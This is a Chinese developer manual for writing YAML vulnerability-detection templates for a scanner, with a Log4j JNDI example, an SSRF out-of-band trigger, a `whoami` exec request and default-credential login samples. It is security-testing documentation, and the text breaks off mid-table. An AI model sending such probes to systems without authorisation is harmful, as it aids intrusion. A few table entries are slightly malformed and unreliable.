# YAML 漏洞模板开发手册

> 版本：v1.3.1
> 目标读者：漏洞研究员、安全工程师、渗透测试人员
> 前置知识：了解 HTTP 协议基础、YAML 语法基础

---

## 目录

1. [模板概述](#1-模板概述)
2. [模板文件结构](#2-模板文件结构)
3. [必填字段详解](#3-必填字段详解)
4. [可选字段详解](#4-可选字段详解)
5. [HTTP 请求块详解](#5-http-请求块详解)
6. [匹配器（Matcher）详解](#6-匹配器matcher-详解)
7. [提取器（Extractor）详解](#7-提取器extractor-详解)
8. [工作流（Workflow）详解](#8-工作流workflow-详解)
9. [占位符与变量](#9-占位符与变量)
10. [Wordlist 字典爆破](#10-wordlist-字典爆破)
11. [指纹预过滤](#11-指纹预过滤)
12. [OOB 带外验证](#12-oob-带外验证)
13. [DSL 表达式](#13-dsl-表达式)
14. [高级特性](#14-高级特性)
15. [完整示例](#15-完整示例)
16. [编写步骤指南](#16-编写步骤指南)
17. [调试技巧](#17-调试技巧)
18. [常见问题](#18-常见问题)

---

## 1. 模板概述

### 1.1 什么是 YAML 模板

YAML 模板是 gosleek 漏洞扫描器的核心检测单元。每个 `.yaml` 文件描述一个漏洞的检测逻辑：

```
┌──────────────────────────────────────────────────────────────┐
│                     YAML 模板结构                            │
│                                                              │
│   元数据区         id / name / severity / tags / ...         │
│   ────────────────  ───────────────────────────────────────  │
│   预处理区         fingerprints / variables / oob-provider   │
│   ────────────────  ───────────────────────────────────────  │
│   执行区（二选一）  http: 单模板模式  |  workflow: 多步模式   │
│   ────────────────  ───────────────────────────────────────  │
│   匹配区           matchers / extractors / wordlist          │
│                                                              │
│   判断结果：所有 matcher 匹配 = 漏洞存在，否则不存在          │
└──────────────────────────────────────────────────────────────┘
```

### 1.2 两种执行模式

| 模式 | 关键字 | 说明 | 适用场景 |
|------|--------|------|----------|
| **单模板模式** | `http` | 一个或多个 HTTP 请求，结果按 `matchers-condition` 聚合 | 单步检测、有回显漏洞 |
| **工作流模式** | `workflow` | 多步骤按依赖关系顺序执行，每步可独立匹配 | 无回显漏洞、多步利用、OOB 验证 |

> **如何选择模式？**
> - 如果一次请求就能判断漏洞存在 → 用 `http` 模式
> - 如果需要先触发、再等待、再验证 → 用 `workflow` 模式
> - 如果漏洞无回显（blind）→ 必须用 `workflow` + OOB

### 1.3 文件命名规范

```
templates/<id>.yaml           # 推荐：文件名与 id 一致
templates/<id>.yml            # 也支持 .yml 扩展名
templates/security/<id>.yaml  # 安全配置类模板放 subdirectory
```

---

## 2. 模板文件结构

完整的模板结构如下：

```yaml
# ============ 第 1 层：元数据 ============
id: "CVE-2021-44228-log4j-rce"     # 必填：唯一标识
name: "Apache Log4j2 RCE"           # 必填：显示名称
description: |                      # 必填：漏洞描述（支持多行）
  Apache Log4j2 存在 JNDI 注入漏洞。
  攻击者可通过构造特殊的日志消息触发远程代码执行。
severity: critical                  # 必填：严重等级
author: "gosleek"                   # 可选：作者名
tags: [cve, rce, jndi, log4j]       # 可选：标签列表
reference:                          # 可选：参考链接
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"

# ============ 第 2 层：分类信息 ============
classification:                     # 可选
  cvss-score: 10.0
  cve-id: "CVE-2021-44228"
  cwe: "CWE-94"

# ============ 第 3 层：预过滤 ============
fingerprints:                       # 可选：指纹预过滤
  - title: "Apache Tomcat"
    header:
      - "Server: Apache-Coyote/1.1"

# ============ 第 4 层：变量 ============
variables:                          # 可选：用户定义变量
  admin_path: "/admin"
  route_id: "{{rand_text_alpha(8)}}"

# ============ 第 5 层：OOB 配置 ============
oob-provider: "ceye"                # 可选：模板级 OOB provider
oob:                                # 可选：模板级 OOB 验证配置
  provider: "ceye"
  matchers:
    - type: json-word
      json-path: data
      json-field: name
      words: ["{{oob_label}}"]

# ============ 第 6 层：执行模式（二选一） ============

# 模式 A：单模板 HTTP
http:
  - raw: |                          # 原始请求
      GET /path HTTP/1.1
      Host: {{Hostname}}
    matchers:                       # 匹配规则
      - type: status
        status: [200]
    extractors:                     # 提取规则
      - name: "token"
        type: "regex"
        regex: ["token=(\\w+)"]

# 模式 B：工作流多步骤
workflow:
  - name: "trigger"                 # 步骤名（必填）
    http:
      - raw: |...
    # 其他字段...

# ============ 第 7 层：模板级默认值 ============
stop-at-first-match: false          # 命中后停止
matchers-condition: "or"            # 请求级聚合条件（默认 or）
matchers:                           # 模板级默认 matcher
  - type: status
    status: [200]
extractors:                         # 模板级默认 extractor
  - name: "global_var"
    type: "regex"
    regex: ["pattern"]
```

### 2.1 字段层次说明

gosleek 引擎按以下优先级处理字段：

```
请求级 > 模板级
  ───────────────────────────────────────────────
  matchers-condition: 请求级 > 模板级
  matchers:           请求级 > 模板级（不覆盖，合并）
  extractors:         请求级 > 模板级（不覆盖，合并）
```

---

## 3. 必填字段详解

### 3.1 id

```yaml
id: "CVE-2021-44228-log4j-rce"
```

- **类型**：字符串
- **必填**：是
- **规则**：在整个扫描中全局唯一
- **用途**：
  - 去重：同一目标 + 同一 id 只检测一次
  - Resume：断点续扫时跳过已完成的 id
  - 筛选：`-id CVE-2021-44228` 可按部分匹配
- **命名建议**：`CVE-年份-编号-描述` 或 `项目名称-检测类型`

### 3.2 name

```yaml
name: "Apache Log4j2 RCE (JNDI Injection)"
```

- **类型**：字符串
- **必填**：是
- **用途**：结果卡片和列表显示的名称
- **建议**：简洁明了，包含漏洞类型

### 3.3 description

```yaml
description: |
  Apache Log4j2 2.0-beta9 through 2.15.0 存在 JNDI 注入漏洞。
  攻击者可通过构造特殊的日志消息（如 ${jndi:ldap://...}）触发
  远程代码执行。此漏洞被 CVSS 评分为 10.0，是历史上最严重的
  漏洞之一。
```

- **类型**：字符串（支持 YAML 多行语法 `|`）
- **必填**：是
- **用途**：结果详情展示
- **`|` 语法**：保留换行符的多行字符串

### 3.4 severity

```yaml
severity: critical
```

- **类型**：枚举值
- **必填**：是
- **可选值**：

| 值 | 含义 | 典型场景 |
|----|------|----------|
| `critical` | 严重 | RCE、SQL 注入、认证绕过 |
| `high` | 高 | 信息泄露、未授权访问 |
| `medium` | 中 | 配置错误、跨站脚本 |
| `low` | 低 | 目录遍历、信息泄露 |
| `info` | 信息 | 版本探测、端口扫描 |

### 3.5 http 或 workflow

两者选其一，不可同时为空：

```yaml
# 单模板模式
http:
  - raw: |...
    matchers:
      - type: status
        status: [200]

# 工作流模式
workflow:
  - name: trigger
    http:
      - raw: |...
```

---

## 4. 可选字段详解

### 4.1 author

```yaml
author: "your-name"
```

- **类型**：字符串
- **可选**：是
- **用途**：记录模板作者

### 4.2 tags

```yaml
tags: [cve, rce, jndi, log4j]
```

- **类型**：字符串数组
- **可选**：是
- **用途**：
  - 筛选：`--tags cve,rce`
  - 结果过滤：`--filter-tags cve`
- **建议**：使用小写、英文、短横线分隔

### 4.3 reference

```yaml
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
  - "https://logging.apache.org/log4j/2.x/security.html"
```

- **类型**：字符串数组
- **可选**：是
- **用途**：结果中的参考链接

### 4.4 classification

```yaml
classification:
  cvss-score: 10.0      # CVSS 3.1 评分 (0.0-10.0)
  cve-id: "CVE-2021-44228"  # CVE 编号
  cwe: "CWE-94"          # CWE 分类
```

- **类型**：对象
- **可选**：是
- **用途**：标准化漏洞分类信息

---

## 5. HTTP 请求块详解

### 5.1 raw 模式（推荐）

直接编写原始 HTTP 请求，灵活度最高。

```yaml
http:
  - raw: |
      POST /api/v1/exec HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/json
      Accept: application/json
      X-Custom-Header: value

      {"command":"whoami","timeout":30}
    timeout: 10
    redirects: false
```

**raw 模式规则**：
1. 第一行必须是请求行：`METHOD /path HTTP/1.1`
2. 之后每行是 `Header-Name: Header-Value`
3. Header 和 Body 之间必须有空行（`\r\n\r\n` 或 `\n\n`）
4. 空行之后是 Body 内容
5. 支持所有占位符（`{{Hostname}}`、`{{oob}}` 等）
6. `$$` 转义为字面量 `$`（JNDI payload 等场景）

**请求行格式**：
```
METHOD /path?query=value HTTP/1.1
```
- METHOD：GET / POST / PUT / DELETE / HEAD / OPTIONS / PATCH
- path：可以是相对路径或完整 URL
- HTTP/1.1：协议版本

### 5.2 path 模式

用结构化字段构建请求，适合简单场景。

```yaml
http:
  - path: ["/admin"]          # 支持多路径：每个路径独立发送请求
    method: "GET"
    headers:
      "X-Test": "value"
    body: "username=admin&password=test"
    body-type: "form"
    timeout: 10
```

**path 模式自动构建规则**：
```
GET /path HTTP/1.1\r\n
Host: {{Hostname}}\r\n
[X-Custom-Header: value\r\n]        ← 用户定义的头（与全局 header 合并）
Connection: close\r\n
\r\n                                ← 空行分隔
[body content]                      ← body-type 决定格式
```

**path 字段说明**：
- `path` 是字符串**列表**，**每个路径都会独立发送请求**
- 每个路径的请求独立匹配（结果按 `matchers-condition` 聚合）
- 示例：检测 8 个路径会发送 8 个独立请求
- **两种 YAML 写法等价**（功能完全相同，仅语法风格不同）：
  ```yaml
  # Flow 风格（内联数组，适合 1-2 个路径）
  path: ["/admin", "/login"]

  # Block 风格（多行列表，适合 3+ 个路径）
  path:
    - "/admin"
    - "/login"
    - "/console"
  ```

**body-type 支持的值**：

| 值 | 说明 | 自动注入 Content-Type | Body 格式 |
|----|------|----------------------|-----------|
| (空) | raw body | 无 | 原样输出 |
| `form` | form-urlencoded | `application/x-www-form-urlencoded` | `key=value&key2=value2`（原样，不做编码） |
| `multipart` | multipart/form-data | `multipart/form-data; boundary=----gosleekFormBoundaryXXXX` | 按 `key=value` 行解析，自动生成 boundary |

**form body 格式**：
```
POST /login HTTP/1.1\r\n
Host: {{Hostname}}\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Connection: close\r\n
\r\n
username=admin&password=test123
```

**multipart body 格式**：
```
POST /upload HTTP/1.1\r\n
Host: {{Hostname}}\r\n
Content-Type: multipart/form-data; boundary=----gosleekFormBoundaryabcd1234\r\n
Connection: close\r\n
\r\n
------gosleekFormBoundaryabcd1234\r\n
Content-Disposition: form-data; name="username"\r\n\r\n
admin\r\n
------gosleekFormBoundaryabcd1234\r\n
Content-Disposition: form-data; name="password"\r\n\r\n
test123\r\n
------gosleekFormBoundaryabcd1234--\r\n
```

**multipart body 写法**：每行一个 `key=value`，以换行分隔：
```yaml
body: |
  username=admin
  password=test123
  file=data
body-type: multipart
```

### 5.3 HTTPRequest 所有字段

```yaml
http:
  # ---- 请求定义（raw 或 path 二选一） ----
  raw: ""                   # 原始请求文本（raw 模式必填）
  path: []                  # 请求路径列表（path 模式）
  method: "GET"             # HTTP 方法（path 模式，默认 GET）
  headers:                  # 请求头（path 模式）
    "X-Custom": "value"
  body: ""                  # 请求体（path 模式）
  body-type: ""             # 请求体类型：empty/form/multipart

  # ---- 网络控制 ----
  timeout: 10               # 超时秒数（0=使用全局默认）
  redirects: false          # 是否跟随重定向（nil=使用全局）
  threads: 1                # 并发线程数（一般不设置）
  rate-limit: 0             # 此请求的速率限制（0=不单独限制）

  # ---- 匹配控制 ----
  matchers-condition: ""    # 匹配条件：and/or（空=使用模板级）
  matchers: []              # 匹配规则列表
  extractors: []            # 提取规则列表
  wordlist: []              # 字典爆破配置

  # ---- 流程控制 ----
  stop-at-first-match: false  # 命中后停止发送此请求块的后续请求
  run-if: ""                  # 条件执行（空/false/0/未解析=跳过）
  probe: false                # 仅探测模式（结果不计入最终判定）
  name: ""                    # 请求名称（用于日志）
```

---

## 6. 匹配器（Matcher）详解

Matcher 是判断漏洞是否存在的核心规则。每个请求块可包含多个 matcher，通过 `matchers-condition` 决定聚合方式。

### 6.1 matchers-condition

```yaml
matchers-condition: "and"    # 所有 matcher 都必须匹配
matchers-condition: "or"     # 任一 matcher 匹配即可（默认）
```

**优先级规则**：
1. 请求级 `matchers-condition` > 模板级 `matchers-condition`
2. 请求级为空时，继承模板级设置
3. 两者都为空时，默认为 `"or"`

### 6.2 Matcher 类型总览

```yaml
matchers:
  # 1. 状态码匹配
  - type: status
    status: [200, 500]

  # 2. 文本匹配
  - type: word
    words: ["vulnerable"]
    part: "body"

  # 3. 正则匹配
  - type: regex
    regex: ["CVE-\\d+-\\d+"]

  # 4. 响应头匹配
  - type: header
    header: ["X-Powered-By: PHP"]

  # 5. 响应体大小
  - type: size
    size: [">1000", "<50000"]

  # 6. 响应时间
  - type: time
    time: ">5"

  # 7. 二进制匹配
  - type: binary
    binary: ["d0cf11"]

  # 8. DSL 表达式
  - type: dsl
    dsl: ["status_code == 200 && contains(body, 'admin')"]

  # 9. JSON 字段匹配（OOB 专用）
  - type: json-word
    json-path: "data"
    json-field: "name"
    words: ["{{oob_label}}"]

  # 10. JSON 二维数组匹配（dnslog 专用）
  - type: json-2darray
    json-2darray-column: 0
    words: ["{{oob_label}}"]
```

### 6.3 各类型详解

#### 6.3.1 status — HTTP 状态码匹配

```yaml
- type: status
  status: [200, 201, 500]     # 匹配列表中任一状态码
- type: status
  status: [404]
  negative: true              # 取反：状态码不为 404
```

**逻辑**：`status` 列表中的任一值与响应状态码相等即匹配。

#### 6.3.2 word — 文本子串匹配

```yaml
- type: word
  words: ["vulnerable", "exploit", "CVE-2021-44228"]
  part: "body"                # body/header/all（默认 all）
  condition: "or"             # or=任一匹配, and=全部匹配
  negative: false             # false=正向匹配, true=取反
  case-insensitive: true      # 大小写不敏感（默认 true）
  encoding: ""                # 对 words 解码：url/base64/hex
```

**part 可选值**：

| part | 匹配范围 | 说明 |
|------|----------|------|
| (空) | all | 响应头 + 正文 |
| `body` | 仅正文 | 响应体内容 |
| `header` | 仅响应头 | 所有响应头 |
| `all` | 响应头 + 正文 | 与空值相同 |
| `interactsh` | 仅 OOB 数据 | OOB 交互数据 |

**condition 可选值**：
- `or`（默认）：words 列表中任一匹配即成功
- `and`：words 列表中全部匹配才成功

**negative 含义**：
- `false`（默认）：匹配即成功
- `true`：不匹配即成功（排除误报）

#### 6.3.3 regex — 正则表达式匹配

```yaml
- type: regex
  regex: ["CVE-\\d{4}-\\d{4,}", "JNDI-Lookup"]
  part: "body"
  condition: "or"
  case-insensitive: true
```

- 使用 Go 正则语法
- `(?i)` 前缀表示不区分大小写
- `regex` 列表与 `condition` 组合：OR=任一匹配，AND=全部匹配

**正则示例**：
```yaml
# 匹配 CVE 编号
regex: ["CVE-\\d{4}-\\d{4,}"]

# 匹配 JWT token
regex: ["eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"]

# 匹配 IP 地址
regex: ["\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}"]
```

#### 6.3.4 header — 响应头匹配

```yaml
- type: header
  header: ["X-Powered-By: PHP/8.1", "Server: Apache"]
  condition: "or"
  negative: false
```

- 格式：`"Header-Name: value-pattern"`
- 支持部分匹配（子串匹配）
- 也可使用 `words` 字段代替 `header`（等价）：
  ```yaml
  - type: header
    words: ["X-Powered-By: PHP"]   # 等价于 header 字段
  ```

#### 6.3.5 size — 响应体大小匹配

```yaml
- type: size
  size: [">1000", "<50000"]     # 支持 >=, <=, ==, !=
```

**运算符**：

| 运算符 | 含义 | 示例 |
|--------|------|------|
| `>` | 大于 | `">1000"` |
| `<` | 小于 | `"<50000"` |
| `>=` | 大于等于 | `">=100"` |
| `<=` | 小于等于 | `"<=\"50000"` |
| `==` | 等于 | `"==2048"` |
| `!=` | 不等于 | `"!=0"` |
| (无运算符) | 精确匹配 | `"1024"` |

#### 6.3.6 time — 响应时间匹配

```yaml
- type: time
  time: ">5"                     # 响应时间超过 5 秒
```

常用于时间盲注检测。时间单位是秒（浮点数）。

**运算符**：同 size，但支持浮点数。

#### 6.3.7 binary — 二进制/十六进制匹配

```yaml
- type: binary
  binary: ["d0cf11"]             # 匹配 DOC 文件签名
  part: "body"
```

- 值为十六进制字符串
- 自动支持 `0x` 前缀和空格
- 奇数长度自动补零

**常见文件签名**：
```yaml
# DOC 文件
binary: ["d0cf11"]
# ELF 可执行文件
binary: ["7f454c46"]
# ZIP 文件
binary: ["504b0304"]
# PDF 文件
binary: ["25504446"]
# PHP 文件
binary: ["<?php"]            # 注意：这是 ASCII 码，不是 hex
```

#### 6.3.8 dsl — DSL 表达式匹配

见 [第 13 章](#13-dsl-表达式) 详解。

```yaml
- type: dsl
  dsl: ["status_code == 200 && contains(body, 'vulnerable')"]
  condition: "or"
```

#### 6.3.9 json-word — JSON 字段匹配

用于 OOB Provider API 响应解析（ceye、callback.red）。

```yaml
# ceye 示例
- type: json-word
  json-path: "data"             # JSON 路径，默认 "data"
  json-field: "name"            # 数组元素中的字段名，默认 "name"
  words: ["{{oob_label}}"]
  condition: "or"

# callback.red 示例
- type: json-word
  json-path: "data"
  json-field: "subdomain"
  words: ["{{oob_label}}"]
```

**工作原理**：
1. 将响应体解析为 JSON 对象
2. 沿 `json-path` 导航到目标数组（默认 `"data"` 键）
3. 从数组每个元素的 `json-field` 字段收集值（默认 `"name"` 键）
4. 对收集的值与 `words` 列表做**强制不区分大小写**子串匹配
5. `condition: and` 要求所有 word 都匹配，`or` 要求任一匹配

**注意**：`json-word` 和 `json-2darray` **强制启用** `case-insensitive: true`，无论是否显式设置。这是为了确保 OOB label（小写）能正确匹配 Provider API 返回的大小写混合的域名。

#### 6.3.10 json-2darray — JSON 二维数组匹配

用于 dnslog.cn API 响应解析。

```yaml
- type: json-2darray
  json-2darray-column: 0        # 匹配第几列（默认 0）
  words: ["{{oob_label}}"]
  condition: "or"
```

**工作原理**：
1. 先尝试将响应体直接解析为数组（根级别二维数组 `[[...],...]`）
2. 若失败，再解析为对象，通过 `json-path`（默认 `"data"`）找嵌套数组
3. 遍历每行，提取第 `json-2darray-column` 列的值
4. 与 `words` 列表做不区分大小写子串匹配

**dnslog 响应格式**：
```json
[["hdmwny.dnslog.cn","1.2.3.4","2026-08-17 10:30:00"],
 ["other.dnslog.cn","5.6.7.8","2026-08-17 10:31:00"]]
```

`json-2darray-column: 0` → 匹配第一列（域名），检查是否包含 `{{oob_label}}`。

### 6.4 Matcher 通用字段

```yaml
- type: "word"
  part: "body"            # 匹配部分：body/header/all/interactsh
  condition: "or"         # 多个 words/regex/header 之间的关系
  negative: false         # 取反匹配
  encoding: ""            # 编码：url/base64/hex
  case-insensitive: false # 大小写不敏感（json-word 默认 true）
  # json-word 专用：
  json-path: "data"       # JSON 路径
  json-field: "name"      # 字段名
  # json-2darray 专用：
  json-2darray-column: 0  # 列索引
```

### 6.5 Matcher 示例合集

**示例 1：简单存在性检测（AND）**
```yaml
matchers:
  - type: status
    status: [200]
  - type: word
    words: ["Index of /"]
matchers-condition: and    # 两个 matcher 都必须匹配
```

**示例 2：多特征匹配（OR）**
```yaml
matchers:
  - type: word
    words: ["vulnerable", "exploit", "CVE-2021-44228"]
matchers-condition: or     # 任一匹配即可
```

**示例 3：排除误报（Negative）**
```yaml
matchers:
  - type: status
    status: [200]
  - type: word
    words: ["admin", "panel"]
    negative: true         # 响应中不包含 "admin" 或 "panel"
matchers-condition: and
```

**示例 4：时间盲注检测**
```yaml
matchers:
  - type: time
    time: ">5"             # 响应时间超过 5 秒
  - type: status
    status: [200]
matchers-condition: and
```

**示例 5：DSL 复杂条件**
```yaml
matchers:
  - type: dsl
    dsl:
      - "status_code == 200"
      - "contains(body, 'admin') || contains(body, 'root')"
      - "!contains(body, 'error')"
matchers-condition: and
```

**示例 6：JSON API 匹配**
```yaml
matchers:
  - type: status
    status: [200]
  - type: json-word
    json-path: "result"
    json-field: "success"
    words: ["true"]
matchers-condition: and
```

---

## 7. 提取器（Extractor）详解

Extractor 从响应中提取数据，供后续步骤或占位符引用。

### 7.1 Extractor 字段

```yaml
extractors:
  - name: "token"                     # 提取变量名（必填，引用时用 {{token}}）
    type: "regex"                     # 类型：regex/word/kval/json/cookie（必填）
    part: "body"                      # 提取位置：body/header/all（默认 body）
    regex: ["Authorization:\\s*Bearer\\s+(\\S+)"]  # regex 模式
    group: 1                          # 捕获组索引（默认 1，0=整个匹配）
    words: ["SESSIONID="]             # word 关键词
    kval: ["session"]                 # URL 参数/表单键名
    json: ["data.token"]              # JSON 路径（点分隔）
    internal: false                   # 仅内部使用，不显示在结果中
```

### 7.2 各类型详解

#### 7.2.1 regex — 正则提取

```yaml
- name: "csrf_token"
  type: "regex"
  part: "body"
  regex: ["<input\\s+name=\"csrf\"\\s+value=\"([^\"]+)\""]
  group: 1                          # 提取第一个捕获组
```

**group 说明**：
- `group: 0` — 返回整个匹配
- `group: 1` — 返回第一个捕获组（默认）
- `group: 2` — 返回第二个捕获组

**多 regex 策略**：依次尝试每个 regex 模式，返回第一个成功匹配的。

#### 7.2.2 word — 关键词提取

```yaml
- name: "session_id"
  type: "word"
  words: ["SESSIONID="]
  part: "header"
```

从响应中提取关键词后的值。

#### 7.2.3 kval — 键值提取

```yaml
- name: "user_id"
  type: "kval"
  kval: ["uid", "user_id"]          # 可指定多个键名
  part: "body"
```

从 body 或 URL 参数中提取指定键的值。

#### 7.2.4 json — JSON 路径提取

```yaml
- name: "api_key"
  type: "json"
  json: ["data.api_key", "result.token"]  # 多个路径，依次尝试
```

**JSON 路径语法**：
- `data.token` — 对象嵌套
- `data.items[0].name` — 数组索引
- `data` — 根对象

#### 7.2.5 cookie — Cookie 提取

```yaml
- name: "phpsessid"
  type: "cookie"
```

从 `Set-Cookie` 响应头中提取指定 cookie 值。`name` 字段即为 cookie 名称。

### 7.3 提取器使用示例

**示例 1：提取 JWT Token**
```yaml
http:
  - raw: |
      POST /api/login HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/json

      {"username":"admin","password":"admin"}
    extractors:
      - name: "jwt_token"
        type: "regex"
        part: "body"
        regex: ['"token":\\s*"([^"]+)"']
        group: 1
```

后续步骤中引用：`Authorization: Bearer {{jwt_token}}`

**示例 2：提取 CSRF Token**
```yaml
http:
  - raw: |
      GET /admin HTTP/1.1
      Host: {{Hostname}}
    extractors:
      - name: "csrf_token"
        type: "regex"
        regex: ['name="csrf_token"\\s+value="([^"]+)"']
        group: 1
      - name: "csrf_token"
        type: "regex"
        regex: ['<meta\\s+name="csrf"\\s+content="([^"]+)"']
        group: 1
```

---

## 8. 工作流（Workflow）详解

工作流支持多步骤检测，每步可独立定义 HTTP 请求和匹配规则。

### 8.1 WorkflowStep 字段

```yaml
workflow:
  - name: "trigger"                   # 步骤名称（必填，全局唯一）
    template: ""                      # 引用其他模板（一般不设置）
    requires: []                      # 前置步骤依赖（字符串数组）
    delay: 0                          # 执行前等待秒数
    provider: ""                      # OOB provider（空=使用全局）
    stop-at-first-match: false        # 此步骤命中后停止后续步骤
    http:                             # HTTP 请求列表（同 http 字段）
      - raw: |...
```

### 8.2 requires（依赖关系）

```yaml
workflow:
  - name: step1          # 无依赖，首先执行
    http: [...]

  - name: step2          # 等待 step1 完成后执行
    requires: [step1]
    http: [...]

  - name: step3          # 等待 step1 和 step2 都完成
    requires: [step1, step2]
    http: [...]

  - name: step4          # 可在 step2 或 step3 完成后执行
    requires: [step2, step3]
    http: [...]
```

**规则**：
- 使用 Kahn 算法进行拓扑排序
- 无 `requires` 的步骤优先执行
- 循环依赖会报错：`circular dependency detected in workflow`
- 引用的步骤名必须在模板中已定义

### 8.3 delay（延迟等待）

```yaml
- name: verify
  requires: [trigger]
  delay: 5              # 等待 5 秒后执行验证
  http: [...]
```

**适用场景**：
- OOB 验证：等待目标执行命令并产生 DNS/HTTP 回调
- 异步操作：等待后端处理完成
- 速率限制：避免请求过于频繁

**建议**：OOB 验证通常设置 3-10 秒延迟。

### 8.4 provider（步骤级 Provider）

```yaml
workflow:
  - name: trigger
    http:
      - raw: |...          # 触发漏洞

  - name: verify-ceye
    requires: [trigger]
    delay: 5
    provider: ceye         # 仅当全局 provider 为 ceye 时执行
    http: [...]

  - name: verify-dnslog
    requires: [trigger]
    delay: 5
    provider: dnslog       # 仅当全局 provider 为 dnslog 时执行
    http: [...]

  - name: verify-callbackred
    requires: [trigger]
    delay: 5
    provider: callbackred  # 仅当全局 provider 为 callbackred 时执行
    http: [...]
```

**跳过逻辑**：
- `step.Provider == ""` → 不跳过（使用全局 provider）
- `step.Provider == activeProvider` → 执行
- `step.Provider != activeProvider` → 跳过并记录日志

### 8.5 stop-at-first-match（步骤级停止）

```yaml
workflow:
  - name: step1
    http: [...]
    stop-at-first-match: true     # 此步骤命中后停止执行后续步骤

  - name: step2
    requires: [step1]
    http: [...]
```

### 8.6 工作流示例：SSRF OOB

```yaml
id: ssrf-oob-detection
name: SSRF Detection (OOB)
severity: critical
tags: [ssrf, oob]

workflow:
  - name: trigger
    http:
      - raw: |
          GET /proxy?url=http://{{oob}} HTTP/1.1
          Host: {{Hostname}}
        matchers:
          - type: status
            status: [200, 302, 500]
        matchers-condition: or

  - name: verify-dns
    requires: [trigger]
    delay: 5
    http:
      - raw: |
          GET /v1/records?token={{oob_token}}&type=dns HTTP/1.1
          Host: api.ceye.io
        matchers:
          - type: status
            status: [200]
          - type: json-word
            json-path: data
            json-field: name
            words: ["{{oob_label}}"]
        matchers-condition: and

  - name: verify-http
    requires: [verify-dns]
    delay: 3
    http:
      - raw: |
          GET /v1/records?token={{oob_token}}&type=http HTTP/1.1
          Host: api.ceye.io
        matchers:
          - type: status
            status: [200]
          - type: json-word
            json-path: data
            json-field: name
            words: ["{{oob_label}}"]
        matchers-condition: and
```

---

## 9. 占位符与变量

### 9.1 内置目标变量

| 占位符 | 说明 | 示例 | 用途 |
|--------|------|------|------|
| `{{Hostname}}` | 主机名+端口 | `example.com:8080` | Host 头 |
| `{{Host}}` | 同 Hostname | `example.com:8080` | 备用 |
| `{{Port}}` | 端口号 | `8080` | 构造 URL |
| `{{Scheme}}` | 协议 | `http` 或 `https` | 构造 URL |
| `{{Path}}` | 路径 | `/api/v1`（默认 `/`） | 相对路径 |
| `{{baseURL}}` | 完整基础 URL | `http://example.com:8080` | 构造完整 URL |
| `{{RootURL}}` | 同 baseURL | `http://example.com:8080` | 备用 |

**注意**：
- `{{Hostname}}` 包含端口（如果 URL 中指定了端口）
- 如果 URL 是 `http://example.com`（无端口），则 `{{Hostname}}` = `example.com`
- 如果 URL 是 `http://example.com:8080`，则 `{{Hostname}}` = `example.com:8080`

### 9.2 OOB 占位符

启用 OOB 后自动注入（取决于当前 provider）：

| 占位符 | ceye | dnslog | callbackred |
|--------|------|--------|-------------|
| `{{oob}}` | `abc123.ceye.io` | `abc123.dnslog.cn` | `abc123.callback.red` |
| `{{oob_label}}` | `abc123` | `abc123` | `abc123` |
| `{{oob_token}}` | API token | PHPSESSID | UUID key |
| `{{oob_domain}}` | `ceye.io` | `dnslog.cn` | `callback.red` |
| `{{interactsh-url}}` | 同 `{{oob}}` | 同 `{{oob}}` | 同 `{{oob}}` |

### 9.3 用户自定义变量

```yaml
variables:
  admin_path: "/admin"
  api_version: "v1"
  # 可引用内置变量和函数
  callback_url: "{{Hostname}}/callback"
  route_id: "gs_{{rand_text_alpha(8)}}"
```

**变量解析规则**：
1. 引擎创建时解析变量值
2. 支持多层依赖（最多 5 轮迭代）
3. 解析结果缓存，后续引用返回同一值
4. 未解析的占位符保留原样（`{{unknown}}`）

### 9.4 动态函数

所有函数通过 `{{func(args)}}` 语法调用。部分函数可省略括号（bare function）。

**随机生成器**：

| 函数 | 签名 | 默认值 | 示例 | 说明 |
|------|------|--------|------|------|
| `randstr` | `randstr(n?)` | 8 | `{{randstr}}` | 随机十六进制字符串 |
| `rand_int` | `rand_int(min, max?)` | 1, 9999 | `{{rand_int(1,100)}}` | 随机整数 |
| `rand_text_alpha` | `rand_text_alpha(n?)` | 8 | `{{rand_text_alpha(10)}}` | 随机小写字母 |
| `rand_text_hex` | `rand_text_hex(n?)` | 16 | `{{rand_text_hex(20)}}` | 随机十六进制 |
| `rand_text_numeric` | `rand_text_numeric(n?)` | 8 | `{{rand_text_numeric(6)}}` | 随机数字 |

**Bare 函数**（可省略括号）：
```yaml
{{randstr}}          # 等价于 {{randstr()}}
{{rand_int(1,100)}}  # 必须带括号（有参数）
{{timestamp}}        # 等价于 {{timestamp()}}
{{uuid}}            # 等价于 {{uuid()}}
```

**字符串操作**：

| 函数 | 签名 | 示例 | 说明 |
|------|------|------|------|
| `to_upper` | `to_upper(s)` | `{{to_upper("hello")}}` → `HELLO` | 转大写 |
| `to_lower` | `to_lower(s)` | `{{to_lower("HELLO")}}` → `hello` | 转小写 |
| `trim` | `trim(s)` | `{{trim("  abc  ")}}` → `abc` | 去空白 |
| `reverse` | `reverse(s)` | `{{reverse("abc")}}` → `cba` | 反转 |
| `concat` | `concat(s1, s2, ...)` | `{{concat("a","b","c")}}` → `abc` | 拼接 |
| `repeat` | `repeat(s, n)` | `{{repeat("ab", 3)}}` → `ababab` | 重复 |

**编码函数**：

| 函数 | 签名 | 示例 | 说明 |
|------|------|------|------|
| `base64_encode` | `base64_encode(s)` | `{{base64_encode("test")}}` | Base64 编码 |
| `base64_decode` | `base64_decode(s)` | `{{base64_decode("dGVzdA==")}}` | Base64 解码 |
| `url_encode` | `url_encode(s)` | `{{url_encode("a b")}}` → `a%20b` | URL 编码 |
| `url_decode` | `url_decode(s)` | `{{url_decode("a%20b")}}` → `a b` | URL 解码 |
| `hex_encode` | `hex_encode(s)` | `{{hex_encode("test")}}` | 十六进制编码 |
| `hex_decode` | `hex_decode(s)` | `{{hex_decode("74657374")}}` | 十六进制解码 |

**哈希函数**：

| 函数 | 签名 | 示例 |
|------|------|------|
| `md5` | `md5(s)` | `{{md5("hello")}}` → `5d41402abc4b2a76b9719d911017c592` |
| `sha1` | `sha1(s)` | `{{sha1("hello")}}` |
| `sha256` | `sha256(s)` | `{{sha256("hello")}}` |

**时间函数**：

| 函数 | 签名 | 示例 | 说明 |
|------|------|------|------|
